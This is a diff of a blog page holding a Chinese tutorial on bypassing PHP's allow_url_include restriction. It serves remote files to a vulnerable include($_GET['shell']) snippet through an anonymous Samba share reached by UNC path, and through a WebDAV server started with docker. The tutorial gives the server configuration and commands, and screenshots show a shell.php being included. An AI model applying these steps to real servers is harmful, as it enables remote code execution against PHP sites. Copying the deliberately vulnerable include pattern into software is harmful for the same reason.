@@ -202,12 +202,12 @@
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
             <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>下面介绍的两个姿势都是先知群里面get到的，这里记录一下，给先知的师傅们倒茶。</p>
-<h1 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h1><p>假设我们有一个这样的代码<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">"shell"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<h1 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h1><p>假设我们有一个这样的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">"shell"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>我们发现通过<code>phpinfo</code>发现<code>allow_url_fopen=Off</code>和<code>allow_url_include=Off</code></p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222028-6c58eb54-7653-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222028-6c58eb54-7653-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -215,7 +215,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514223651-b6220bf6-7655-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514223651-b6220bf6-7655-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -224,67 +224,49 @@
 <h3 id="SAMBA服务器配置"><a href="#SAMBA服务器配置" class="headerlink" title="SAMBA服务器配置"></a>SAMBA服务器配置</h3><blockquote>
 <p>Samba是在Linux和UNIX系统上实现SMB协议的一个软件</p>
 </blockquote>
-<p>安装SAMBA<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install samba</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>创建SMB共享目录<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/www/html/share/</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>配置新创建的SMB共享目录的权限<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 0555 /var/www/html/share/</span><br><span class="line">chown -R nobody:nogroup /var/www/html/share/</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>清空<code>/etc/samba/smb.conf</code>文件中的内容<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; /etc/samba/smb.conf</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>将下面内容粘贴到<code>/etc/samba/smb.conf</code><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">workgroup = WORKGROUP</span><br><span class="line">server string = Samba Server %v</span><br><span class="line">netbios name = indishell-lab</span><br><span class="line">security = user</span><br><span class="line">map to guest = bad user</span><br><span class="line">name resolve order = bcast host</span><br><span class="line">dns proxy = no</span><br><span class="line">bind interfaces only = yes</span><br><span class="line"></span><br><span class="line">[ica]</span><br><span class="line">path = /var/www/html/share</span><br><span class="line">writable = no</span><br><span class="line">guest ok = yes</span><br><span class="line">guest only = yes</span><br><span class="line">read only = yes</span><br><span class="line">directory mode = 0555</span><br><span class="line">force user = nobody</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>重启<code>smb</code>服务<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service smbd restart</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>安装SAMBA<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install samba</span><br></pre></td></tr></table></figure></p>
+<p>创建SMB共享目录<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/www/html/share/</span><br></pre></td></tr></table></figure></p>
+<p>配置新创建的SMB共享目录的权限<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 0555 /var/www/html/share/</span><br><span class="line">chown -R nobody:nogroup /var/www/html/share/</span><br></pre></td></tr></table></figure></p>
+<p>清空<code>/etc/samba/smb.conf</code>文件中的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; /etc/samba/smb.conf</span><br></pre></td></tr></table></figure></p>
+<p>将下面内容粘贴到<code>/etc/samba/smb.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">workgroup = WORKGROUP</span><br><span class="line">server string = Samba Server %v</span><br><span class="line">netbios name = indishell-lab</span><br><span class="line">security = user</span><br><span class="line">map to guest = bad user</span><br><span class="line">name resolve order = bcast host</span><br><span class="line">dns proxy = no</span><br><span class="line">bind interfaces only = yes</span><br><span class="line"></span><br><span class="line">[ica]</span><br><span class="line">path = /var/www/html/share</span><br><span class="line">writable = no</span><br><span class="line">guest ok = yes</span><br><span class="line">guest only = yes</span><br><span class="line">read only = yes</span><br><span class="line">directory mode = 0555</span><br><span class="line">force user = nobody</span><br></pre></td></tr></table></figure></p>
+<p>重启<code>smb</code>服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service smbd restart</span><br></pre></td></tr></table></figure></p>
 <p>然后访问一下，发现可以正常访问</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222432-fe128316-7653-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222432-fe128316-7653-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p><code>\\192.168.163.128\ica\shell.php</code>内容为：<br></p><figure class="image-bubble">
+<p><code>\\192.168.163.128\ica\shell.php</code>内容为：<br><figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514224804-47be592e-7657-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514224804-47be592e-7657-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
-            </figure><p></p>
+            </figure></p>
 <p>尝试包含一波，成功包含</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222633-460cdae0-7654-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222633-460cdae0-7654-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这种方法还是比较局限的，因为这种<code>unc</code>只能是在windows下使用，而且国内的运营商对<code>smb</code>还是比较敏感的，毕竟被勒索病毒搞怕了/捂脸。。。。。</p>
 <h2 id="第二种姿势：利用webdav"><a href="#第二种姿势：利用webdav" class="headerlink" title="第二种姿势：利用webdav"></a>第二种姿势：利用webdav</h2><p><strong> PS：这个思路是Lz1y师傅在ph师傅小密圈提到的，tql </strong></p>
 <p>利用条件：依赖于Windows的webclient服务，需要在目标环境开启sc start webclient服务才能利用</p>
-<p>用docker启动一个webdav服务器（ph师傅给的）<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>用docker启动一个webdav服务器（ph师傅给的）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav</span><br></pre></td></tr></table></figure></p>
 <p>然后把php文件放到<code>~/webdav/data</code>里面</p>
-<p>尝试包含，包含成功<br></p><figure class="image-bubble">
+<p>尝试包含，包含成功<br><figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190515001220-0d01bde2-7663-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190515001220-0d01bde2-7663-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
-            </figure><br>注意包含的路径是<code>//ip//webdav/shell.php</code>而不是<code>//ip/webdav/shell.php</code>，至于为什么呢我也不是很清楚，如果是用浏览器直接打开的话两种方式都可以，但是不知道为啥放在<code>php</code>上后者的那种方式就不行了，有知道的师傅还请不吝赐教。<p></p>
+            </figure><br>注意包含的路径是<code>//ip//webdav/shell.php</code>而不是<code>//ip/webdav/shell.php</code>，至于为什么呢我也不是很清楚，如果是用浏览器直接打开的话两种方式都可以，但是不知道为啥放在<code>php</code>上后者的那种方式就不行了，有知道的师傅还请不吝赐教。</p>
 <h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener">http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a></p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>
+
         </div>
 
         <blockquote class="post-copyright">
